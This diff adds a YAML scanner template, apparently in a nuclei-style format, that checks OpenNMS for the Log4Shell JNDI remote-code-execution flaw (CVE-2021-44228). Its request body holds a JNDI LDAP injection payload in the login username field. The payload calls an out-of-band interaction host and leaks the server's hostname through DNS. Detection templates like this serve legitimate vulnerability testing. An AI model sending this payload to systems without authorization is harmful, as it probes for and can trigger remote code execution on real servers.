@@ -1,0 +1,31 @@
+id: opennms-log4j-rce
+brief:
+    title: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
+    by: johnk3r
+    level: critical
+    about: OpenNMS JNDI is susceptible to remote code execution via Apache Log4j 2.14.1 and before. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LD...
+    label:
+        - jndi
+        - log4j
+        - rce
+        - opennms
+        - cve
+        - cve2021
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/opennms/j_spring_security_check'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Referer: '{{RootURL}}/opennms/login.jsp'
+      body: j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
